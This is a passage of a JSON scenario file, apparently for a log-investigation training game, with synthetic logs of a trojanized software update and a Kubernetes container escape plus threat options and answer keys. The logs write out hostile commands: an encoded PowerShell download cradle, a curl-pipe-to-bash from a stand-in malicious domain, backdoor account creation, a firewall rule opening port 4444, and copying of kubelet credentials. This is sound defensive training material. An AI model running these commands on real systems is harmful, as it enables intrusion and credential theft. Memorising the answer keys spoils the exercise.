    "suspiciousLines": [0, 1, 2, 3, 4, 5, 8, 9, 10, 11, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33],
    "knownEntities": {
      "ips": [
        {"address": "104.28.42.16", "info": "J. Wilson's home IP - New York"},
        {"address": "104.28.48.22", "info": "M. Johnson's home IP - Chicago"},
        {"address": "185.156.73.42", "info": "Unknown IP - Kiev, Ukraine"}
      ],
      "users": [
        {"username": "j.wilson", "role": "Financial Analyst"},
        {"username": "m.johnson", "role": "HR Manager"},
        {"username": "a.smith", "role": "Marketing Specialist"},
        {"username": "d.brown", "role": "Sales Representative"},
        {"username": "s.miller", "role": "Project Manager"},
        {"username": "t.parker", "role": "IT Support Specialist"},
        {"username": "security-admin", "role": "Security Administrator"}
      ]
    }
  },
  {
    "id": "scenario12",
    "title": "Supply Chain Attack",
    "description": "Investigate logs for evidence of compromise through a third-party software update.",
    "threatType": "intrusion",
    "difficulty": 3,
    "timeLimit": 400,
    "logs": [
      {
        "id": "update_log",
        "name": "Software Update Logs",
        "type": "update",
        "timestamp": "2025-04-26",
        "source": "software-management",
        "content": [
          {"text": "2025-04-26T02:15:22Z INFO [Update.Check] Package: DevTools v3.5.2, Current: 3.5.1, Available: 3.5.2, Source: devtools-cdn.example.org"},
          {"text": "2025-04-26T02:15:25Z INFO [Update.Check] Package: SecuritySuite v2.1.0, Current: 2.0.8, Available: 2.1.0, Source: security-updates.example.net"},
          {"text": "2025-04-26T02:15:28Z INFO [Update.Check] Package: DatabaseManager v4.2.3, Current: 4.2.3, Status: Up to date"},
          {"text": "2025-04-26T02:20:15Z INFO [Update.Download] Package: DevTools v3.5.2, Size: 35.8 MB, Source: devtools-cdn.example.org, Integrity: VERIFIED"},
          {"text": "2025-04-26T02:22:33Z INFO [Update.Download] Package: SecuritySuite v2.1.0, Size: 22.4 MB, Source: security-updates.example.net, Integrity: VERIFIED"},
          {"text": "2025-04-26T02:25:45Z INFO [Update.Install] Package: DevTools v3.5.2, Status: SUCCESS"},
          {"text": "2025-04-26T02:28:15Z INFO [Update.Install] Package: SecuritySuite v2.1.0, Status: SUCCESS"}
        ]
      },
      {
        "id": "process_log",
        "name": "Process Creation Events",
        "type": "process",
        "timestamp": "2025-04-26",
        "source": "endpoint-protection",
        "content": [
          {"text": "2025-04-26T02:25:48Z INFO [Process.Create] User: SYSTEM, Process: DevTools.Updater.exe (PID: 4582), Parent: services.exe (PID: 752)"},
          {"text": "2025-04-26T02:26:15Z INFO [Process.Create] User: SYSTEM, Process: DevTools.exe (PID: 4590), Parent: DevTools.Updater.exe (PID: 4582)"},
          {"text": "2025-04-26T02:26:22Z WARNING [Process.Create] User: SYSTEM, Process: cmd.exe (PID: 4595), Parent: DevTools.exe (PID: 4590)"},
          {"text": "2025-04-26T02:26:33Z WARNING [Process.Create] User: SYSTEM, Process: powershell.exe (PID: 4600), Parent: cmd.exe (PID: 4595), Command Line: 'powershell.exe -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADQALgAxADkAOAAuADIANQAuADIAMAAvAGIAZQBhAGMAbwBuAC4AdAB4AHQAJwApAA=='"},
          {"text": "2025-04-26T02:28:22Z INFO [Process.Create] User: SYSTEM, Process: SecuritySuite.Updater.exe (PID: 4620), Parent: services.exe (PID: 752)"},
          {"text": "2025-04-26T02:28:45Z INFO [Process.Create] User: SYSTEM, Process: SecuritySuite.exe (PID: 4625), Parent: SecuritySuite.Updater.exe (PID: 4620)"},
          {"text": "2025-04-26T02:45:15Z INFO [Process.Create] User: SYSTEM, Process: svchost.exe (PID: 4650), Parent: services.exe (PID: 752)"},
          {"text": "2025-04-26T02:45:33Z WARNING [Process.Create] User: SYSTEM, Process: rundll32.exe (PID: 4655), Parent: svchost.exe (PID: 4650), Command Line: 'rundll32.exe c:\\windows\\temp\\update.dll,EntryPoint'"},
          {"text": "2025-04-26T03:15:22Z WARNING [Process.Create] User: SYSTEM, Process: cmd.exe (PID: 4700), Parent: rundll32.exe (PID: 4655), Command Line: 'cmd.exe /c net localgroup administrators backdoor /add'"},
          {"text": "2025-04-26T03:17:33Z WARNING [Process.Create] User: SYSTEM, Process: wmic.exe (PID: 4710), Parent: cmd.exe (PID: 4700), Command Line: 'wmic process list full'"},
          {"text": "2025-04-26T03:20:15Z WARNING [Process.Create] User: SYSTEM, Process: netsh.exe (PID: 4715), Parent: cmd.exe (PID: 4700), Command Line: 'netsh advfirewall firewall add rule name=\"Remote Access\" dir=in action=allow protocol=TCP localport=4444'"}
        ]
      },
      {
        "id": "network_log",
        "name": "Network Connection Events",
        "type": "network",
        "timestamp": "2025-04-26",
        "source": "endpoint-protection",
        "content": [
          {"text": "2025-04-26T02:20:15Z INFO [Net.Connection] Process: DevTools.Updater.exe (PID: 4582), Local: 10.20.30.42:52342, Remote: 93.184.216.34:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-26T02:22:33Z INFO [Net.Connection] Process: SecuritySuite.Updater.exe (PID: 4620), Local: 10.20.30.42:52350, Remote: 198.51.100.234:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-26T02:26:35Z WARNING [Net.Connection] Process: powershell.exe (PID: 4600), Local: 10.20.30.42:52375, Remote: 104.198.25.20:80, State: ESTABLISHED, Protocol: HTTP"},
          {"text": "2025-04-26T02:45:45Z WARNING [Net.Connection] Process: rundll32.exe (PID: 4655), Local: 10.20.30.42:52422, Remote: 104.198.25.20:443, State: ESTABLISHED, Protocol: HTTPS"},
          {"text": "2025-04-26T03:22:15Z WARNING [Net.Connection] Process: svchost.exe (PID: 4650), Local: 10.20.30.42:4444, Remote: 104.198.25.20:55822, State: ESTABLISHED, Protocol: TCP"},
          {"text": "2025-04-26T03:25:33Z WARNING [Net.DNS] Query: pastebin.com, Response: 104.20.209.21, Process: cmd.exe (PID: 4700)"},
          {"text": "2025-04-26T03:25:45Z WARNING [Net.Connection] Process: powershell.exe (PID: 4725), Local: 10.20.30.42:52485, Remote: 104.20.209.21:443, State: ESTABLISHED, Protocol: HTTPS"}
        ]
      },
      {
        "id": "file_log",
        "name": "File Operation Events",
        "type": "filesystem",
        "timestamp": "2025-04-26",
        "source": "endpoint-protection",
        "content": [
          {"text": "2025-04-26T02:25:48Z INFO [File.Modify] User: SYSTEM, Process: DevTools.Updater.exe (PID: 4582), Path: C:\\Program Files\\DevTools\\DevTools.exe"},
          {"text": "2025-04-26T02:26:33Z WARNING [File.Create] User: SYSTEM, Process: powershell.exe (PID: 4600), Path: C:\\Windows\\Temp\\beacon.ps1"},
          {"text": "2025-04-26T02:28:45Z INFO [File.Modify] User: SYSTEM, Process: SecuritySuite.Updater.exe (PID: 4620), Path: C:\\Program Files\\SecuritySuite\\SecuritySuite.exe"},
          {"text": "2025-04-26T02:45:22Z WARNING [File.Create] User: SYSTEM, Process: powershell.exe (PID: 4600), Path: C:\\Windows\\Temp\\update.dll"},
          {"text": "2025-04-26T02:45:33Z WARNING [File.Read] User: SYSTEM, Process: rundll32.exe (PID: 4655), Path: C:\\Windows\\Temp\\update.dll"},
          {"text": "2025-04-26T03:15:45Z WARNING [File.Modify] User: SYSTEM, Process: cmd.exe (PID: 4700), Path: C:\\Windows\\System32\\config\\SAM"},
          {"text": "2025-04-26T03:25:45Z WARNING [File.Create] User: SYSTEM, Process: powershell.exe (PID: 4725), Path: C:\\Windows\\Tasks\\updater.ps1"}
        ]
      }
    ],
    "threats": [
      {
        "type": "intrusion",
        "name": "Supply Chain Attack",
        "description": "Compromised software update containing malicious code used to gain initial access."
      },
      {
        "type": "malware",
        "name": "Trojanized Software Update",
        "description": "Legitimate software update containing covert malicious functionality."
      },
      {
        "type": "intrusion",
        "name": "Command and Control Communication",
        "description": "Malware establishing communication with attacker-controlled server for remote control."
      }
    ],
    "threatOptions": [
      {
        "type": "intrusion",
        "name": "Supply Chain Attack",
        "description": "Compromised software update containing malicious code used to gain initial access."
      },
      {
        "type": "malware",
        "name": "Trojanized Software Update",
        "description": "Legitimate software update containing covert malicious functionality."
      },
      {
        "type": "intrusion",
        "name": "Command and Control Communication",
        "description": "Malware establishing communication with attacker-controlled server for remote control."
      },
      {
        "type": "intrusion",
        "name": "Privilege Escalation",
        "description": "Unauthorized elevation of access privileges to gain administrative rights."
      },
      {
        "type": "malware",
        "name": "Fileless Malware",
        "description": "Malicious code operating in memory without writing files to disk."
      },
      {
        "type": "credential_theft",
        "name": "Local Account Creation",
        "description": "Creation of unauthorized accounts for persistent access."
      },
      {
        "type": "intrusion",
        "name": "Firewall Rule Modification",
        "description": "Changes to firewall configuration to allow unauthorized network access."
      },
      {
        "type": "data_exfiltration",
        "name": "Data Staging",
        "description": "Collection and preparation of sensitive data for extraction."
      },
      {
        "type": "intrusion",
        "name": "Living Off The Land",
        "description": "Use of legitimate system tools and features for malicious purposes."
      },
      {
        "type": "malware",
        "name": "Backdoor Installation",
        "description": "Installation of unauthorized remote access functionality."
      }
    ],
    "suspiciousLines": [9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36],
    "knownEntities": {
      "ips": [
        {"address": "10.20.30.42", "info": "Developer Workstation"},
        {"address": "93.184.216.34", "info": "DevTools CDN Server"},
        {"address": "198.51.100.234", "info": "SecuritySuite Update Server"},
        {"address": "104.198.25.20", "info": "Unknown External IP"},
        {"address": "104.20.209.21", "info": "Pastebin IP"}
      ],
      "users": [
        {"username": "SYSTEM", "role": "System Account"},
        {"username": "backdoor", "role": "Unknown - Recently created"}
      ]
    }
  },
  {
    "id": "scenario13",
    "title": "Kubernetes Container Escape",
    "description": "Investigate logs for evidence of container escape and privilege escalation in a Kubernetes environment.",
    "threatType": "intrusion",
    "difficulty": 3,
    "timeLimit": 390,
    "logs": [
      {
        "id": "container_log",
        "name": "Container Runtime Logs",
        "type": "container",
        "timestamp": "2025-04-27",
        "source": "kube-worker-02",
        "content": [
          {"text": "2025-04-27T10:15:22Z INFO [Container.Started] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, Image: webapp:1.5.2, Namespace: production"},
          {"text": "2025-04-27T10:15:35Z INFO [Container.Started] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: sidecar-proxy, Image: proxy:2.3.1, Namespace: production"},
          {"text": "2025-04-27T10:30:45Z INFO [Container.Status] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, CPU: 15%, Memory: 235MB, Status: Running"},
          {"text": "2025-04-27T11:15:22Z WARNING [Container.Exec] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: webapp, Command: 'curl -s https://malicious-domain.example/exploit.sh | bash'"},
          {"text": "2025-04-27T11:15:33Z WARNING [Container.Process] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: webapp, Process: bash, Command: './exploit.sh'"},
          {"text": "2025-04-27T11:16:15Z WARNING [Container.Process] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: root, Process: kubectl, Command: 'kubectl get secrets -n kube-system'"},
          {"text": "2025-04-27T11:17:22Z WARNING [Container.Volume] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, Action: ACCESS_DENIED, Path: /var/lib/kubelet"},
          {"text": "2025-04-27T11:18:33Z WARNING [Container.Process] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: root, Process: apt-get, Command: 'apt-get update && apt-get install -y procps net-tools'"},
          {"text": "2025-04-27T11:20:45Z WARNING [Container.Process] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: root, Process: netstat, Command: 'netstat -ano'"},
          {"text": "2025-04-27T11:22:15Z WARNING [Container.Process] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, User: root, Process: ps, Command: 'ps aux'"},
          {"text": "2025-04-27T11:25:33Z CRITICAL [Container.Escape] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, Action: MOUNT_HOST_PATH, Path: /proc/1/root/"},
          {"text": "2025-04-27T11:28:45Z CRITICAL [Container.Escape] Pod: webapp-frontend-5d7bc4b845-2zxpq, Container: webapp, Action: HOST_PROCESS_EXECUTION, Process: /bin/bash"}
        ]
      },
      {
        "id": "kubernetes_log",
        "name": "Kubernetes Audit Logs",
        "type": "k8s-audit",
        "timestamp": "2025-04-27",
        "source": "kube-apiserver",
        "content": [
          {"text": "2025-04-27T10:05:15Z INFO [Kube.Auth] User: system:serviceaccount:production:webapp, Action: authentication, Status: allowed"},
          {"text": "2025-04-27T10:05:18Z INFO [Kube.API] User: system:serviceaccount:production:webapp, Verb: get, Resource: configmaps, Namespace: production, Status: allowed"},
          {"text": "2025-04-27T11:16:15Z WARNING [Kube.API] User: system:serviceaccount:production:webapp, Verb: list, Resource: secrets, Namespace: kube-system, Status: forbidden"},
          {"text": "2025-04-27T11:30:22Z WARNING [Kube.API] User: system:serviceaccount:production:webapp, Verb: create, Resource: pods, Namespace: production, Status: forbidden"},
          {"text": "2025-04-27T11:35:33Z WARNING [Kube.API] User: system:anonymous, Verb: get, Resource: pods, Namespace: kube-system, Status: forbidden"},
          {"text": "2025-04-27T11:40:15Z CRITICAL [Kube.Auth] User: system:anonymous, Action: authentication, Status: allowed"},
          {"text": "2025-04-27T11:40:22Z WARNING [Kube.API] User: system:anonymous, Verb: list, Resource: secrets, Namespace: kube-system, Status: forbidden"},
          {"text": "2025-04-27T11:45:33Z WARNING [Kube.API] User: system:node:kube-worker-02, Verb: list, Resource: pods, Namespace: production, Status: allowed"},
          {"text": "2025-04-27T11:45:45Z CRITICAL [Kube.API] User: system:node:kube-worker-02, Verb: get, Resource: secrets, Namespace: kube-system, Status: allowed"},
          {"text": "2025-04-27T11:46:15Z CRITICAL [Kube.API] User: system:node:kube-worker-02, Verb: get, Resource: secrets, Name: bootstrap-token-abcdef, Namespace: kube-system, Status: allowed"}
        ]
      },
      {
        "id": "node_log",
        "name": "Host System Logs",
        "type": "system",
        "timestamp": "2025-04-27",
        "source": "kube-worker-02",
        "content": [
          {"text": "2025-04-27T11:25:45Z WARNING [System.Process] User: root, Process: bash (PID: 12345), Parent: containerd-shim (PID: 32456), Command: 'bash'"},
          {"text": "2025-04-27T11:26:15Z WARNING [System.Process] User: root, Process: cat (PID: 12350), Parent: bash (PID: 12345), Command: 'cat /etc/kubernetes/kubelet.conf'"},
          {"text": "2025-04-27T11:28:33Z WARNING [System.Process] User: root, Process: ls (PID: 12355), Parent: bash (PID: 12345), Command: 'ls -la /var/lib/kubelet/pods/'"},
          {"text": "2025-04-27T11:30:22Z WARNING [System.Process] User: root, Process: cp (PID: 12362), Parent: bash (PID: 12345), Command: 'cp /etc/kubernetes/pki/ca.crt /tmp/'"},
          {"text": "2025-04-27T11:32:15Z WARNING [System.Process] User: root, Process: cp (PID: 12370), Parent: bash (PID: 12345), Command: 'cp /etc/kubernetes/kubelet.conf /tmp/'"},
          {"text": "2025-04-27T11:33:45Z WARNING [System.File] User: root, Process: cat (PID: 12380), Path: /tmp/kubelet.conf, Action: READ"},
          {"text": "2025-04-27T11:35:22Z WARNING [System.Network] Process: curl (PID: 12385), Local: 10.32.0.4:45123, Remote: 185.82.219.45:443, Protocol: HTTPS"},
          {"text": "2025-04-27T11:38:15Z WARNING [System.Process] User: root, Process: bash (PID: 12345), Command: 'kubectl --kubeconfig=/tmp/kubelet.conf get secrets -n kube-system bootstrap-token-abcdef -o yaml'"}
        ]
      },
      {
        "id": "network_log",
        "name": "Network Flow Logs",
        "type": "network",
        "timestamp": "2025-04-27",
        "source": "cloud-netflow",
        "content": [
          {"text": "2025-04-27T10:15:45Z INFO [Net.Flow] SrcIP: 35.240.12.15 (Internet), DstIP: 10.32.0.4 (webapp-frontend-5d7bc4b845-2zxpq), SrcPort: 48562, DstPort: 80, Protocol: TCP, Bytes: 1542, Packets: 15, Action: ACCEPT"},
          {"text": "2025-04-27T11:15:22Z WARNING [Net.Flow] SrcIP: 10.32.0.4 (webapp-frontend-5d7bc4b845-2zxpq), DstIP: 104.24.0.36 (malicious-domain.example), SrcPort: 45123, DstPort: 443, Protocol: TCP, Bytes: 4562, Packets: 32, Action: ACCEPT"},
          {"text": "2025-04-27T11:16:33Z INFO [Net.Flow] SrcIP: 10.32.0.4 (webapp-frontend-5d7bc4b845-2zxpq), DstIP: 10.32.0.1 (kubernetes.default.svc), SrcPort: 45126, DstPort: 443, Protocol: TCP, Bytes: 2456, Packets: 22, Action: ACCEPT"},
          {"text": "2025-04-27T11:25:45Z WARNING [Net.Flow] SrcIP: 10.32.0.4 (webapp-frontend-5d7bc4b845-2zxpq), DstIP: 10.240.0.5 (kube-worker-02), SrcPort: 45180, DstPort: 10250, Protocol: TCP, Bytes: 5423, Packets: 42, Action: ACCEPT"},
          {"text": "2025-04-27T11:35:22Z WARNING [Net.Flow] SrcIP: 10.240.0.5 (kube-worker-02), DstIP: 185.82.219.45 (Unknown), SrcPort: 45123, DstPort: 443, Protocol: TCP, Bytes: 12568, Packets: 86, Action: ACCEPT"},
          {"text": "2025-04-27T11:38:45Z WARNING [Net.Flow] SrcIP: 10.240.0.5 (kube-worker-02), DstIP: 10.32.0.1 (kubernetes.default.svc), SrcPort: 45192, DstPort: 443, Protocol: TCP, Bytes: 6453, Packets: 52, Action: ACCEPT"}
        ]
      }
    ],
    "threats": [
      {
        "type": "intrusion",
        "name": "Container Escape",
        "description": "Attacker escaping container isolation and accessing the host system."
      },
      {
        "type": "intrusion",
        "name": "Kubernetes Privilege Escalation",
        "description": "Using compromised node credentials to access sensitive Kubernetes secrets."
      },
      {
        "type": "data_exfiltration",
        "name": "Kubernetes Secret Exfiltration",
        "description": "Theft of Kubernetes authentication tokens for persistent cluster access."
      }
    ],
    "threatOptions": [
      {
        "type": "intrusion",
        "name": "Container Escape",
        "description": "Attacker escaping container isolation and accessing the host system."
      },
      {
        "type": "intrusion",
        "name": "Kubernetes Privilege Escalation",
        "description": "Using compromised node credentials to access sensitive Kubernetes secrets."
      },
      {
        "type": "data_exfiltration",
        "name": "Kubernetes Secret Exfiltration",
        "description": "Theft of Kubernetes authentication tokens for persistent cluster access."
      },
      {
        "type": "malware",
        "name": "Container Malware",
        "description": "Malicious code executed within a container environment."
      },
      {
        "type": "intrusion",
        "name": "Kubernetes API Server Attack",
        "description": "Unauthorized attempts to access and manipulate the Kubernetes control plane."
      },
      {
        "type": "credential_theft",
        "name": "Service Account Token Theft",
        "description": "Unauthorized access and theft of Kubernetes service account credentials."
      },
      {
        "type": "intrusion",
        "name": "Kubelet API Exploitation",
        "description": "Exploiting the kubelet API to execute commands on nodes or containers."
      },
      {
        "type": "intrusion",
        "name": "Exposed Dashboard Access",
        "description": "Unauthorized access to Kubernetes dashboard due to insufficient authentication."
      },
      {
        "type": "malware",
        "name": "Cryptomining in Container",
        "description": "Unauthorized cryptocurrency mining software deployed in container environment."
      },
      {
        "type": "intrusion",
        "name": "Container Role Abuse",
        "description": "Exploiting excessive permissions granted to container service accounts."
      },
      {
        "type": "intrusion",
        "name": "Kubernetes RBAC Misconfiguration",
        "description": "Exploiting overly permissive role-based access control settings in Kubernetes."
      }
    ],
    "suspiciousLines": [3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38],
    "knownEntities": {
      "ips": [
        {"address": "10.32.0.4", "info": "Pod: webapp-frontend-5d7bc4b845-2zxpq"},
        {"address": "10.240.0.5", "info": "Node: kube-worker-02"},
        {"address": "10.32.0.1", "info": "Service: kubernetes.default.svc"},
        {"address": "104.24.0.36", "info": "External: malicious-domain.example"},
        {"address": "185.82.219.45", "info": "Unknown external IP"},
        {"address": "35.240.12.15", "info": "Legitimate user traffic"}
      ],
      "users": [
        {"username": "system:serviceaccount:production:webapp", "role": "Kubernetes Service Account"},
        {"username": "system:anonymous", "role": "Unauthenticated User"},
        {"username": "system:node:kube-worker-02", "role": "Node Identity"}
      ]
    }
  }
])
